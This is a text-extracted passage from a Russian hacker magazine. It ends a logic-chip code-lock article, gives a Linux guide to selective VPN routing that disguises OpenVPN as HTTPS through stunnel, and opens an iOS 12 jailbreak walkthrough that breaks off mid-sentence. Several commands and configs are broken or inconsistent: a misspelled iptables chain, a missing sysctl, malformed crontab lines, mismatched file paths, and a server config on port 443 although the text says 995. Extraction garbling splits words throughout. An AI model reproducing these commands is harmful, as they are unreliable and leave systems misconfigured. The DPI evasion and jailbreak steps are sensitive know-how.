(561ТМ2), можно соб рать схему с тактовой кнопкой и светодиодом, которая
будет помнить свое сос тояние. Первое нажатие зас тавит све тодиод гореть,
второе нажатие его погасит. При этом нам даже не потребуется микрокон‐
троллер и мы не напишем ни строчки кода!





КОДОВЫЙ ЗАМОК НА РЕГИСТРАХ
Теперь пришло время для более серьезных вещей. Я собрал на макетной
плате кодовый замок на микросхемах 561‐й серии. Часть из них ты уже зна‐
ешь, другую часть мы раз берем в процессе.





В первую оче редь следует определиться с вводом. Здесь шесть кнопок
для первых шести цифр 1–6 (больше не помес тилось) и кнопка сброса. Сиг‐
нал с них подается на RS‐триггеры, что помога ет справиться с дре безгом
контактов. Далее у нас есть четыре микросхемы К561ТМ2, это дает нам
восемь бит информации о сос тоянии устройства.





  Для удобства я сразу приведу прин ципиальную схему. Впрочем, ее всег‐
  да можно восстановить самостоятельно

Обрати вни мание, что пер вая группа D‐триггеров связана последовательно:
инверсный выход через вентиль NAND блокиру ет тактовый сигнал следующе‐
го. Таким образом, пока не будет вер но подобрана первая цифра ключа,
остальная схема не станет реагировать на нажатия. Кроме того, на этот же
вентиль подается инверсный выход самого триггера, так что, как только нуж‐
ная кнопка нажата в первый раз, блок отключается и далее внутреннее сос‐
тояние D‐триггера уже не меняется.
  Отдельного рассмотрения зас луживает пара D‐триггеров U3A и U6A. У них
общий тактовый сигнал, а вход данных вто рого зависит от выхода первого.
Так как изначально все триггеры сброшены в ноль, то даже после однократ‐
ного нажатия нужной кнопки выход второго не изме нится и последний
из триггеров будет все так же заб локирован (ины ми словами, ноль из U3A
перекочует в U6A, но глобально это ничего не меня ет).
  Однако первый регистр из пары все‐таки поменяет свое состояние, так
как по приходу тактового сигнала на его входе данных содержится логическая
единица от инвер сного выхода второго. Зна чит, на его выходе уже будет
высокий уровень и нам потребуется еще один тактовый сигнал (нажатие
на кнопку), чтобы протолкнуть «единичку» во второй регистр. Таким образом,
можно сделать вывод, что одну из кнопок требуется нажать два раза подряд,
после чего разбло кируется пос ледний D‐триггер.
   Кстати, трехвходовые вентили NAND для разрешения подачи тактового сиг‐
нала на D‐триггер содержатся в микросхемах К561ЛА9 (по три штучки на кор‐
пус).
  Разумеется, если взять такую схему отдельно, в ней будет существенный
изъян: можно подобрать ключ, просто перебирая все кнопки одна за дру гой.
В какой‐то момент мы уга даем пер вую верную цифру, после чего перей дем
ко второй, третьей и так далее.
  Поэтому нам нужна возможность сброса состояния всех D‐триггеров,
как только превыше но разрешенное количество попыток. Для этого требует‐
ся в первую очередь орга низовать подсчет, регис трируя нажатие любой циф‐
ры. Поэтому я взял парочку четырехвходовых вентилей NOR (К561ЛЕ6).
  Логический ноль на их выходе обра зуется всякий раз, когда нажата
какая‐либо  из  подключенных  кнопок.  Объеди ним  выходы  вентилей
с помощью операции И — НЕ. При этом сра бота ет такое правило: инвертор
на выходе логического элемен та можно переместить на все его входы, но при
этом поменяется и сам тип элемента (NOR переходит в NAND, и наоборот).
Таким образом, NAND на выходе можно рассмат ривать как NOR, а инверторы
на его входах оказываются рядом с инверто рами на выходах блоков NOR
и взаимно аннигилируют. В результате мы получаем один большой эле мент
OR, что и тре бовалось для нашего счетчика.
   Кстати, схема самого счетчика выглядит так.





Он построен на базе трех D‐триггеров, так что у нас три бита и восемь воз‐
можных состояний. Инверсный выход первого бло ка подается на вход, так что
по восходящему фрон ту тактового сигнала BIT0 внутренне го сос тояния
переходит из ноля в единичку (и наобо рот). При этом выход соединен с CLK
следующего  и  каждое  вто рое  переключение  приводит  к изме нени ям
для BIT1.
  Далее нам остается толь ко отслеживать комбинацию 101 для пяти раз‐
решенных попыток и подать сигнал сброса, если пос ледний из D‐триггеров,
хранящих наш секретный код, все еще не ока зался в сос тоянии логичес кой
единицы (случай правиль ной комбинации).





Работу всей схемы можно пос мотреть на видео. Успешный код акти виру ет
таймер на микросхеме КР1006ВИ1,  которая демонс трирует анимацию
на светодиодной шкале.
ТРЮКИ



  ПИНГВИНЬЯ
    ТРОПА

         ПРОСТЫЕ РЕЦЕПТЫ
         ДЛЯ ВЫБОРОЧНОГО
      ШИФРОВАНИЯ ТРАФИКА
             В LINUX





Есть много способов обойти региональные
блокировки  и  обеспечить  анонимность.
Такие  термины,  как TOR, VPN,  прокси,
у всех на слуху. Чтобы подключить и настро‐
ить их, не требуется специальных знаний,       Александр «Plus» Рак                                                                                         Участник сообщества Om‐
но существуют и более изящные решения.         skLUG.электронногоИнженер отдела
Сегодня я рас скажу о методике обхода          взаимодействия"ИнформационноМКУ
блокировок в Linux с маскиров кой тра фика        техническогоplus@omsklug.comуправления".
и покажу несколько скрип тов для авто мати‐
зации это го. Их можно без труда перенести
на Raspberry Pi, чтобы сделать умный мар‐
шрутизатор.


           WARNING

                      Эта  статья  не  является  руководством.  Она
                       написана исключительно  с целью  ознакомить
                        тебя с некото рыми функциональными возможнос‐
                      тями маршрутизации в системах  Linux. Автор
                      и редак ция не несут никакой ответственности
                        за  результат  использования описанных  здесь
                      методов и приемов.


Linux предоставляет огромный набор функций для маршрутизации и инстру‐
ментов ее конфигурирова ния. Опытные сисадмины знают об этом и исполь‐
зуют арсенал Linux на полную катушку. Но и мно гие даже продвинутые поль‐
зователи не догадывают ся, сколько удобства могут принес ти все эти замеча‐
тельные возможности. Сегодня мы создадим таблицы маршрутизации и опи‐
шем правила про хода по ним, а также автоматизиру ем админис трирование
этих таблиц. Итак, наши творческие планы:
 • определимся с тем, что нам требуется: установим необходимые пакеты
   и разберемся, зачем они нужны;
 • изучим общий прин цип работы связ ки;
 • настроим защищенный канал VPN с использованием OpenVPN + stunnel;
 • составим списки адресов и опишем области их применения;
 • создадим скрипт для быстрого добавления домена или IP‐адреса в списки
   IPSet с добавлением в таб лицу маршрутизации и включением в правила
   перенаправления;
 • используем SSH для предос тавления безопасного канала связи в эти
  ваши интерне ты.


НЕМНОГО ТЕОРИИ
Что нам понадобится, что бы все работало, и желательно — комфортно?
Само собой, iptables, куда же без него. Еще iproute2, он и позволит нам
насоздавать кучу таблиц. IPSet потребу ется для того, чтобы не городить ого‐
род из множества правил iptables.


Что есть что
 • iptables — утилита командной строки. Базовое средс тво управления
   работой файрвола для ядер Linux.
 • iproute2 — набор утилит для управления параметрами сетевых устройств
   в ядре Linux.
 • IPSet — инструмент для работы со списками IP‐адресов и сетевых портов
   в  сетевом  фильтре. Формирует  список  в  специальном  формате
   для передачи файрволу.
 • stunnel — инструмент организа ции шифрованных соединений для кли‐
   ентов или серверов, которые не поддерживают TLS или SSL. Stunnel
   перехватывает незашифрованные данные, которые должны были отпра‐
   виться в сеть, и шифрует их. Программа работа ет как в Unix‐системах, так
   и в Windows. В качес тве шифрования использует OpenSSL для реализации
   базового протокола TLS и SSL.
 • OpenVPN — VPN‐сервер  с  поддержкой шифрования библиотекой
   OpenSSL. Клиентские час ти дос тупны практически на всех платформах.
  Умеет работать через прокси типа Socks, HTTP, через NAT и сетевые филь‐
   тры.



Про все эти утилиты можно отыскать много информа ции в интернете, причем
с примерами настроек в самых разных вари антах. Мы станем использовать
iptables для мар кировки пакетов. У нас будут два варианта настройки. Пер‐
вый — когда машина, на которой выполняется обход, сама подключена к VPN.
Второй вариант — когда в сети находится узел (виртуал ка, Raspberry Pi
или любой другой хост с Linux), играющий роль маршрутизатора. Далее мы
разберем эти варианты чуть подробнее.


КОРОТКО О ДВУХ ВАРИАНТАХ
Клиент и сервер будут уста навливать зашифрованный канал связи по 443‐му
порту (stunnel) и передавать внутри OpenVPN по 995‐му порту. Снаружи
это должно выглядеть как обычный HTTPS.





              Иллюс тра ция работы stunnel + OpenVPN

И вот тут можно реализовать две схемы подключения.
  Вариант 1. На клиент ской машине iptables будет маркировать пакеты
неким флагом, если адреса в пакетах и списках IPSet совпадут, и передавать
их для маршрутизации.
  Далее помеченные фла гом пакеты будут отправлены по заранее соз‐
данной таблице маршру тиза ции, остальные пойдут по маршруту, заданному
по умолчанию. С помощью консоли или неболь шого скрипта мы поправим
этот список адресов. В зависимос ти от ситуации списков может быть нес‐
колько.
  Вариант 2. В качестве клиента выступит хост в локальной сети (виртуал‐
ка, Raspberry  Pi или какое‐нибудь дру гое устройство). Он будет указан
в качестве основного шлюза на компь ютерах, с которых нужен доступ
к ресурсам через VPN. Получив запрос для IP‐адреса из списка, шлюз вклю‐
чит NAT и отправит такой трафик в VPN. Остальной трафик будет маршру тизи‐
роваться до шлюза по умолчанию без NAT.
  Для Linux‐систем мы можем оставить шлюз по умол чанию и установить
у себя IPSet и iproute2, а потом настроить их ана логично нас тройкам «про‐
межуточного» хоста‐маршру тизатора. В этом слу чае на уровне клиента будет
отбираться трафик по тому же списку IPSet. То есть то, что в списке, будет
отправляться на промежу точный хост‐маршрутизатор и далее в VPN. Осталь‐
ное будет маршрутизироваться по умолчанию.


РЕАЛИЗАЦИЯ
Предположим, что где‐то далеко в облаке у нас уже есть VPS‐сервер с Ubuntu
или Debian. В других дистрибутивах отличия будут, скорее всего, только
в установке необходимых пакетов. Этот хост в нашей конфигурации будет
использоваться в качестве сервера VPN. Рекомендаций, какой VPS лучше
использовать, в интернетах полным‐полно — на раз ный бюджет, с разными
конфигурациями и условиями.
   Устанавливаем на сервере OpenVPN, stunnel, git:


sudo apt install openvpn stunnel4 git

Далее воспользуемся готовым скриптом для настройки сервера OpenVPN.
Можно, конечно, настроить все вручную, и я советую поступить именно так.
Информацию о том, как пра вильно сконфигурировать OpenVPN, нетрудно
отыскать в Сети. Но если нужно получить результат очень быстро и тебе лень
возиться, то вот решение.


git clone https://github.com/Nyr/openvpn‐install.git
cd openvpn‐install
sudo ./openvpn‐install.sh

Получаем скрипт установки и запускаем его. Он поможет нам создать поль‐
зовательские ключи и сертификаты, если нужно — изменить адре сацию сети.
Все очень доступно и понятно. На выходе для каждого пользователя мы
получим один файл, внут ри которого будет конфигурационный ключ и сер‐
тификаты (сервера и пользователя). Переда ем этот файл на клиент.
  Открываем конфигура ционный файл сервера OpenVPN и правим его.
Выбираем нужный порт — тот, который на сервере будет свободен для под‐
клю чения. Порт лучше использовать более‐менее неприметный  (я выб‐
рал 995‐й, обыч но поч товые порты оставляют открытыми), чтобы клиент мог
гарантированно подключиться к VPN‐серверу.
   Вот как будет выглядеть наш конфиг:


port 443
proto tcp
dev tun0
sndbuf 0
rcvbuf 0
ca ca.crt
cert server.crt
key server.key
dh dh.pem
auth SHA512
tls‐auth ta.key 0
topology subnet
server 10.8.0.0 255.255.255.0
ifconfig‐pool‐persist ipp.txt
push "redirect‐gateway def1 bypass‐dhcp"
push "dhcp‐option DNS 208.67.222.222"
push "dhcp‐option DNS 208.67.220.220"
push "route 10.8.0.0 255.255.255.0"
route 192.168.31.0 255.255.255.0
keepalive 10 120
cipher AES‐256‐CBC
user nobody
group nogroup
persist‐key
persist‐tun
status openvpn‐status.log
verb 3
crl‐verify crl.pem

Следующим шагом настро им stunnel:


sudo nano /etc/stunnel/stunnel.conf


output = /var/log/stunnel.log
[openvpn]
client = no
accept = 443
connect = localhost:443
cert = /etc/stunnel/stunnelsrv.pems

Тут все просто:
 • описываем, куда будут сохранять ся логи;
 • указываем название сервиса в произвольной форме;
 • выбираем, в каком режиме работа ет устройство: сервера или клиента.
  В данном случае client = no ука зывает на режим сервера;
 • accept = 443 указывает порт, к которо му будем подключаться снаружи
   (443‐й порт выбран не прос то так — в 99% случаев он всегда открыт, про‐
  ще прикинуться обычным HTTPS, и нас не заметят даже при DPI).

Генерируем клю чи и сертифика ты для stunnel:


sudo openssl req ‐nodes ‐new ‐days 365 ‐newkey rsa:1024 ‐x509 ‐keyout
 stunnelsrv.pem ‐out stunnel.pem

На этом этапе важно помнить, что у нас на стороне сервера работают Open‐
VPN на порте 995, proto tcp, dev tun0 и stunnel на порте 443. Все остальные
настройки — стандартные.
  Переходим к клиенту:


sudo apt install iproute2 ipset stunnel4 git openvpn

Все, что нужно, поставили, теперь нас траиваем stunnel на стороне клиента:


output = /var/log/stunnel.log


[openvpn]
client = yes
accept = 127.0.0.1:995
connect = IP:443


cert = /etc/stunnel/stunnel.pem

Здесь мы  указываем,  куда  выводить  логи,  режим  клиента  включен.
С помощью директивы accept мы говорим, на какой адрес и порт передавать
соединение и  куда, собственно, подключаться  клиенту  stunnel  (опция
connect). Ну и какой сертификат использовать.
  Передаем файл клиента OpenVPN с сервера. Проверяем настрой ки:
используется порт 995, proto tcp, dev tun0. Очень важ ный момент: нам нужно
объявить маршрут до нашего VPS через шлюз по умолчанию. Иначе получит‐
ся, что stunnel установит соединение, потом подклю чится VPN и попытается
все перенаправить в туннель, но stunnel уже не сможет работать, так как хост
и порт будут недоступны. Также отключаем перенап равление всего трафика
в VPN, проверяем адрес подключения и порт. Адрес VPN‐сервера в конфиге
будет 127.0.0.1 — то есть localhost. Подразумевается, что stunnel уже проб‐
росил нужный порт клиента. Должно получиться примерно следующее:


client
dev tun
proto tcp
sndbuf 0
rcvbuf 0
remote 127.0.0.1 995
resolv‐retry infinite
nobind
persist‐key
persist‐tun
remote‐cert‐tls server
auth SHA512
cipher AES‐256‐CBC
setenv opt block‐outside‐dns
key‐direction 1
#redirect‐gateway def1
pull‐filter ignore redirect‐gateway
#добавляем в конфиг OpenVPN клиента белый IP‐адрес VPN‐сервера
route IP 255.255.255.255 net_gateway
#ip route add table obhod default dev tun0
verb 3

Итак, на сервере и клиенте установлены и нас троены OpenVPN и stunnel.
Безопасное соединение уста новлено. Дальше будем рассматривать каждый
вариант по очереди.


Вариант 1: клиент VPN на машине пользовате ля
Первым делом создадим список IP‐адресов, который будем использовать
далее:


sudo ipset ‐N vpn iphash

Добавим в него один адрес для тес тов:


sudo ipset ‐A vpn 8.8.8.8

Теперь нам необ ходимо маркировать пакеты с адресами наз начения,
которые совпадают со списком.


sudo iptables ‐ OUTOUT ‐t mangle ‐m set ‐‐match‐set vpn dst ‐j MARK
‐‐set‐mark (1 или 0x1)

В результате наших действий iptables при совпадении в адресе назначения
и адресе из списка IPSet начнет маркировать такой трафик. Дальше соз‐
дадим новую таблицу маршру тиза ции, для этого пропишем ее в файле /etc/
iproute2/rt_tables с очередностью выше, чем default (253):


252     vpn

Теперь надо создать правило и маршрут для маркированных пакетов.


sudo ip rule add table vpn prio 1000 fwmark (1 или 0x1)
sudo ip route add table vpn dev tun0 default

Не забываем включить rp_filter для обеспечения асимметричной маршру‐
тизации и разрешаем переб рос пакетов меж ду интерфейсами, на случай
если  кому‐то нужно будет предоставить дос туп  к  закрытым ресурсам
в локальной сети.


sudo sysctl net.ipv4.tcp_fwmark_accept=1
sudo sysctl net.ipv4.conf.all.rp_filter=2
sudo net.ipv4.ip_forward=1

Теперь включим NAT для трафика, который направля ется в VPN.


sudo iptables ‐t nat ‐I POSTROUTING ‐o tun0 ‐j MASQUERADE

Если нужно предоставить доступ из локальной сети через свой VPN, правило
iptables нужно немного подпра вить, а именно перенес ти в другую цепочку.


sudo iptables ‐I PREROUTING ‐t mangle ‐m set ‐‐match‐set tovpn dst ‐j
 MARK ‐‐set‐mark 0x1

В итоге у нас получается, что все адреса из спис ка IPSet VPN идут через
безопасное соединение, остальные направляются через маршрут по умол‐
чанию.


Вариант 2: клиент VPN на маршру тизаторе
Теперь рассмотрим случай, когда VPN‐соединение у нас выпол няет не кли‐
ентская машина, а некий узел в сети и все нас троено на нем аналогично при‐
меру выше. Тогда нам нуж но либо указать этот узел в качестве шлюза
по умолчанию, либо установить на клиентской машине IPSet и iproute2
и правильно ее настроить.
  В этом случае сработают локальные IPSet и iproute2 и направят на про‐
межуточный сервер‐маршрутизатор пакет, а тот сверит адрес наз начения
со своим списком IPSet и, если обна ружит совпадение, отправит пакет в VPN,
если совпадения не найдет — переш лет на шлюз по умолчанию.
  Неудобство такого приема состоит в том, что нужно дважды вносить IP‐
адреса в списки. Сначала на сервере‐маршру тизаторе, а второй раз —
в свой локальный список IPSet. Зато это позволя ет более гибко пользоваться
маршрутизацией.
   Стоит также отметить еще один вариант, о котором не говорилось выше.
Можно установить на сервер‐маршру тиза тор VPN‐клиент и stunnel, а потом
убрать из конфига строку pull‐filter ignore redirect‐gateway. Тогда
весь полученный трафик будет завернут в VPN‐туннель. Останется лишь
локально вести IPSet для направления нужного трафика через разные шлюзы.


IPSET
Списки IPSet очень удобно использовать, если нужно быстро разрешить либо
запретить входящие или исходящие соединения на сервер. Так, например,
многие реализуют географическую фильтрацию: про ще один раз занести все
в списки и одним правилом зап ретить весь входящий трафик отовсюду, кро‐
ме этого списка. Например:


sudo iptables ‐A INPUT ‐m set ‐‐match‐set !RU src ‐j DROP

Это правило заблокирует все входящие соединения, кроме адресов из спис‐
ка ipset RU.
   IPSet, как видишь, удоб ный инс трумент, который значительно сокращает
таблицу правил iptables. В час тности, хорошо быва ет объединять в отдельные
списки сети серверов, адреса админов, осталь ных пользователей и так
далее. А потом уже разом зап рещать доступ одним и разрешать другим.


АВТОМАТИЗАЦИЯ ПОСЛЕ СБОЕВ/ПЕРЕЗАГРУЗОК
Чтобы не потерять все настроенные нами параметры, добавим в crontab
периодическое сох ранение пра вил IPSet и iptables.


sudo crontab ‐e


# Каждую первую минуту каждого часа, то есть раз в час
1 * * * * /bin/bash root ipset save > /opt/ipset.rules
1 * * * * iptables‐save root > /opt/firewall.rules

И в /etc/rc.local добавим вос становление:


ipset restore < /opt/routers/ipset.rules
iptables‐restore < /opt/routers/iptables.rules

А теперь напишем скрипт, который будет обходить правила iprule и iproute
и в случае, если чего‐то не хва тает, допишет недос тающее. Скрипт можно
сделать демоном, чтобы он постоянно висел в памяти и мониторил сос тояние
системы, а можно запускать только при старте ОС. В целом второго варианта
вполне достаточно.
  Исходный код скрипта check ты най дешь в архиве по ссылке в конце
статьи, а общий его смысл такой: проверяем таб лицу маршрутизации и, если
маршрута нет, добавляем его. Потом ту же проверку выполняем с правилом
таблицы. Затем смотрим правило iptables, которое маркиру ет пакеты.
  Напоследок напишем скрипт, который поз волит нам более удобно добав‐
лять IP‐адреса в списки IPSet, чтобы каждый раз не ломиться в консоль. Этот
скрипт выглядит так:


#!/bin/bash


test=$(zenity ‐‐entry ‐‐title="Добавление адреса в ipset списки "
‐‐text="Введите адрес ip или домена")
initip=$(dig +short "$test" ‐u 1.1.1.1)


if [ ! ‐n "$initip" ]; then
zenity ‐‐password ‐‐title="Введите пароль администратора" | sudo ‐S
ipset ‐exist ‐A vpn "$test"
echo "$test" >> /opt/iptovpn.txt
else
zenity ‐‐password ‐‐title="Введите пароль администратора" | sudo ‐S
ipset ‐exist ‐A vpn "$initip"
echo "$initip" >> /opt/iptovpn.txt
fi


sudo ipset save > /opt/ipset.rules

При запуске мы вво дим имя домена или сразу IP‐адрес. Скрипт переварит
и то и другое, после чего и запиха ет IP в список IPSet.
   Также в архиве ты найдешь скрипт add_in_ﬁle, который читает файл
со списком доменов, получа ет IP и складыва ет в списки IPSet.


ЗАКЛЮЧЕНИЕ
Итак, что у нас получилось? А вот что. Мы подняли зашифрованный, «белый»
с точки зрения провайдера канал HTTPS. Внутри у него ходит наш OpenVPN.
Клиент заворачивает туда то, что нам нужно, и не отправляет того, что не нуж‐
но. В принципе, можно написать еще пару правил iptables, в которых указано,
кому дозволено ходить по адресам из заданного списка, а кому нет. Можно
указать источники запросов для большей безопасности и для того, чтобы
туда, не дай бог, не залез любознательный поль зователь. Это реализуется
с помощью вто рого списка IPSet, где придет ся вбить доверенные хосты,
которые будут поль зоваться дос тупом.
  При желании всю эту не слишком навороченную архитектуру можно раз‐
вернуть на Raspberry Pi с «Линуксом» и тас кать его с собой в качестве
маленького маршрутизатора. Он где угодно обеспечит тебе надежное,
безопасное и шифрованное соединение, до которо го не доберется ни один
товарищ майор.


        WWW

                    •Архив со скрип тами к статье
ТРЮКИ
 КАК СЛОМАТЬ
   ЯБЛОКО





      ПОШАГОВАЯ ИНСТРУКЦИЯ
      ПО ДЖЕЙЛБРЕЙКУ IOS 12





Спору нет: айфон — очень удобный аппа‐
рат, особенно для  тех, кто без оглядки
переехал в страну Apple. Но есть в iOS одна
особенность, которая времена ми изрядно
портит кровь владельцам iPhone и зас‐       Валентин Холмогоров                                                                                               valentin@holmogorov.ru
тавляет ехидно улыбаться поклонников An‐
droid: устанавливать приложения из сто рон‐
них источников нельзя. Если ты обладатель
iPhone и тебе позарез необходимо пос‐
тавить программу не из App Store, выход
только один: джейлбрейк.


В этой статье мы пошагово опишем два варианта джейлбрейка для iOS
12.4 и, конечно же, снабдим инс трукцию веселыми картинками.


           WARNING

                      Вся информация в этой статье приведена исклю‐
                        чительно  в  образовательных   целях.  Автор
                      и редак ция не несут никакой ответственности
                        за последствия повторения описан ных здесь дей‐
                         ствий. Помни:  выполняя любые  манипуляции
                       со своим смартфоном, ты действуешь на свой
                        страх и риск.



ЧТО К ЧЕМУ
Джейлбрейк (от англ. Jailbreak, «побег из тюрь мы») — это организация
не санкционированного разработ чиком дос тупа к файловой системе в iOS
с целью открыть перед пользователем воз можность установки приложе ний
из «левых» репозиториев и исследова ния внут ренностей ОС. Как правило,
для этого используются обна руженные в iOS уязвимости. Именно поэтому
возможность джейла появляется обычно нес колько поз же выхода оче редной
версии iOS. Apple со временем закрывает выявленные дыры, но исследова‐
тели отыскивают все новые и новые лазей ки.
   Весь известный на сегодняшний день ассортимент методов джейлбрейка
принято делить на две условные категории. От вязанный (непривязанный)
джейл (untethered jailbreak) делается один раз и навсегда, такое устрой ство
можно перезагружать неоднократно без потери доступа к файловой системе.
Слетает он только после перепрошивки девай са. Оче вид но, что подобный
джейлбрейк возможен далеко не на всех версиях iOS.
  Полуотвязанный джейлбрейк (semi‐untethered  jailbreak) работает лишь
до первой перезагрузки или отключения питания устройства. После вклю‐
чения айфона потребуется заново запустить ути литу джейлбрейка, которая
повторно зальет на телефон все необходимые компоненты и зас тавит его
загрузиться в рабочем режиме.
   Рассматриваемые нами сегодня методы взлома относятся к полуотвя зан‐
ному типу и работают на всех версиях iOS 12.x.x, кроме 12.3, 12.3.1, 12.3.2,
12.4.1, 12.4.2. Чтобы узнать, какая версия iOS установлена сейчас на твоем
устройстве, перейди в раз дел «Настройки → Основные → Об этом устрой‐
стве». Здесь в строке «Версия ПО» будет ука зана текущая версия операци‐
онной системы.





           Определение версии операционной системы

Я опишу два способа взломать устройство с iOS 12 — с использованием ути‐
лит unc0ver и Chimera. Последняя не поддержи вает девайсы, оборудованные
процессором A12 и A12X, то есть iPhone XR, XS, XS Max, iPad Air 3, iPad Pro (11,
12.9‐3G) и iPad mini 5. Для этих устройств можно использовать unc0ver — она
работает со всеми версиями iPhone с 5S по XS Max включительно, iPad Air
версий 1–6, iPod Touch (6G, 7G), iPad Pro (9.7, 12.9, 12.9‐2G, 10.5, 11, 12.9‐3G)
и iPad mini (2–5).
  На всякий случай отмечу, что джейлбрейк описанными в этой статье
методами невозможен на заблокированном устройстве. Если твой телефон
не активирован или требует ввести пароль Apple ID, который ты не знаешь
или не помнишь, ничего не получится.


ПРЕДВАРИТЕЛЬНЫЕ ЛАСКИ
Прежде чем мы приступим непосредственно к джейлбрейку, необ ходимо
выпол нить несколько подготовитель ных шагов. Для начала нужно на всякий
случай создать резервную копию девайса. Для это го запусти на компьюте ре
iTunes, подключи к нему iPhone при помощи шнура и подтверди на компьюте‐
ре и телефоне доверительные отношения связ ки этих устройств.





  Доверительные отношения нужно подтвердить сна чала на компьютере…





                    …потом на самом iPhone

В окне iTunes щелкни мышью на значке телефона в верхней части левой
панели и в окне «Обзор» установи переключатель «Автоматичес кое создание
копий» в положение «Этот компьютер», пос ле чего нажми на кнопку «Создать
копию сейчас».





                 Создаем резервную копию iPhone

Теперь необходимо отключить на телефоне блокировку системы паролем,
Touch ID и Face ID. Для этого переходим в «Настройки», открываем раз дел
«Touch ID и код‐пароль», после чего выключа ем эти методы авторизации.





                 От клю чаем Touch ID и код‐пароль

Следующий важный этап. Если на телефоне вклю чена двухфакторная аутен‐
тификация (а если она включена, отключить ее штатными средствами опе‐
рационной системы уже невозможно), нуж но соз дать пароль для приложе ний,
который будет использоваться при джейлбрейке. Про верить состояние двух‐
факторной аутентификации можно на экране «Нас тройки»: для этого вой ди
в настройки Apple ID, кос нувшись своего имени, и перей ди в раздел «Пароль
и безопасность».





         Проверяем состояние двухфакторной аутентификации

Если двухфакторная аутентификация включена, открой на компьютере в бра‐
узере страницу Apple ID, авторизуйся на ней, после чего в раз деле «Безопас‐
ность → Пароли приложений» нажми на ссылку «Создать пароль» и следуй
инструкциям на экране. Этот пароль пот ребуется ввести на одном из этапов
джейлбрейка.
  Мобильные устрой ства Apple очень любят без спроса загружать и устанав‐
ливать обновления операционной системы. Если очередное обновление ска‐
чано, но не установлено, его нужно уда лить. Для этого перейди в раздел
«Настройки → Основные → Хранилище iPhone (iPad)», выбери в списке заг‐
руженный образ операционной системы и на открывшемся экране нажми
надпись  «Удалить  программу»,  после  чего  подтверди  свое  действие
во всплывающем окне.
  Навсегда отучить айфон искать и загружать обновления поможет сле‐
дующее хитрое кол дунство. Запусти Safari, перей ди по ссылке https://betapro‐
ﬁles.com/   и,  воспользовавшись  соответс твующей  кнопкой,   загрузи
на телефон профиль от Apple TV — tvOS 12. Во всплывающем окне нажми
на кнопку Download anyways. Бра узер сооб щит тебе, что сайт пытается заг‐
рузить конфигурационный про филь, — нажми «Разрешить». После успешной
загрузки зайди на телефоне в раздел «Настройки → Основные → Профиль»,
выбери загруженный профиль tvOS Beta Software Proﬁle и нажми «Уста‐
новить». Подтверди это действие во всплывающем окне. Сис тема предложит
перезагрузить телефон — после перезагрузки функция автоматического
поиска и скачивания обновлений будет отключена.





   Отучаем iPhone автоматически ска чивать и устанавливать обновления

Теперь нужно перейти в раз дел «Нас тройки → Siri и Поиск» и выключить все
функции Siri, а затем еще раз перезагрузить телефон.
   Что ж, предварительные шаги мы успешно выполнили, настало вре мя
приступать к самому интерес ному — непосредс твенно взлому.


           WARNING

                     Для успешного завершения процеду ры приложе‐
                      ние iTunes должно быть установлено на твоем
                      компьютере.  Но  его  не  следует  запускать
                      до окончания джейлбрейка!





                                     Продолжение статьи →
ТРЮКИ               ← НАЧАЛО СТАТЬИ
 КАК СЛОМАТЬ ЯБЛОКО
        ПОШАГОВАЯ ИНСТРУКЦИЯ ПО ДЖЕЙЛБРЕЙКУ
                                              IOS 12





ДЖЕЙЛБРЕЙК С ПОМОЩЬЮ UNC0VER
Запусти на компьюте ре браузер, открой сайт cydiaimpactor.com и скачай под‐
ходящую для своей операционной системы версию программы Cydia Im‐
pactor. Приложение распространяется в виде архива, который необходимо
распаковать на диск. Если ты используешь Windows, запусти impactor.exe,
подклю чи айфон к компьютеру и закрой iTunes, если он запустится автомати‐
чески.
   Скачай файл Undecimus‐v3.7.0‐b3.ipa (его, например, можно найти на
GitHub) и перетащи его в окошко Cydia Impactor. На экране отобразится
диалоговое окно, в котором ты должен будешь ввести email, служащий
логином твоего Apple ID, и пароль от учетной записи.





                  Вво дим логин и пароль Apple ID

Если на телефоне вклю чена двухфакторная аутентификация, программа поп‐
росит тебя ввести пароль для приложений — помнишь, мы создавали его
на сайте appleid.apple.com? Самое время пустить этот пароль в дело.
   Программа сделает все необ ходимое с фай лом .ipa и установит приложе‐
ние unc0ver на твой телефон. Теперь на самом iPhone перейди в окно «Нас‐
тройки → Основные → Профили и управление устройством», в разделе «ПО
разработчика» нажми на стро ку с адресом электронной почты, соответству‐
ющим твоему Apple ID, а затем — на надпись «Доверять».





                Нас тра иваем приложение на айфоне

Закрой окно «Настрой ки», вклю чи на телефоне ави арежим, после чего запус‐
ти мобильное приложение unc0ver и нажми кра сивую синюю кнопку Jailbreak.
Программа выдаст предупреждение о том, что сис темный снапшот переиме‐
нован, и предложит перезагрузиться — нажми Оk.





                     Джейлбрейк начался!

После перезагрузки снова запус ти на телефоне unc0ver и нажми Jailbreak.
Возможно, эту процедуру придется повторить несколько раз — до тех пор
пока на экране не появится окошко с надписью Jailbreak Completed. В резуль‐
тате всех этих манипуляций на одном из экра нов твоего айфона отобразится
значок Cydia — приложения, поз воляющего уста навливать программы из сто‐
ронних репозиториев. Ура, все получилось! Не забудь отключить авиаре жим
в настройках телефона.





                      Джейлбрейк удался!


Настройка Cydia
В принципе, уже сразу пос ле уста новки Cydia готова к работе. Запус тив при‐
ложение, ты можешь пользовать ся им ана логично App Store: нажав на значок
с изображением лупы в пра вом нижнем углу, введи название интересу ющей
тебя программы, выбери нужный пункт из списка и установи ее.
   Чтобы подключить к Cydia новые репозитории, наж ми на кнопку «Источни‐
ки» в нижней части окна. На экра не отоб разится список уже подключенных
источников приложений. Наж ми на надпись «Правка» справа вверху, затем —
«Добавить» в левой верхней части окна. В открывшемся окошке введи адрес
нужного репозитория. Списки дос тупных репозиториев Cydia можно найти
в интернете, например здесь.





                Добавляем репозитории в Cydia

Обычно владельцам взло манных устройств Apple рекомендуют установить
файловый менеджер Filza File Manager для работы с папками и файлами в iOS
(его можно отыскать в репозитории https://tigisoftware.com/cydia/)
и терминал для выполнения консольных команд NewTerm 2. Также в Cydia
можно найти множество твиков iOS, позволяющих менять глубокие настройки
системы, недоступные в обычном режиме работы устройства.


           WARNING

                      Будь  предельно  осторожен,  уда ляя  файлы
                      или пап ки в iOS с использованием файловых
                     менед жеров, особенно это касается компонентов
                       системы. Любое неосмотрительное и необдуман‐
                      ное действие может закирпичить твое устрой‐
                          ство.



ДЖЕЙЛБРЕЙК С ПОМОЩЬЮ CHIMERA
Для джейлбрейка с помощью Chimera все предварительные действия пол‐
ностью аналогичны тем, что описаны в предыду щих разделах. Для взлома
нужно скачать файл Chimera‐1.3.9.ipa .
  Остальное нам уже хорошо зна комо: запускаем Cydia Impactor, под клю‐
чаем телефон к компьютеру, перетаскива ем ска чанный файл Chimera‐1.3.
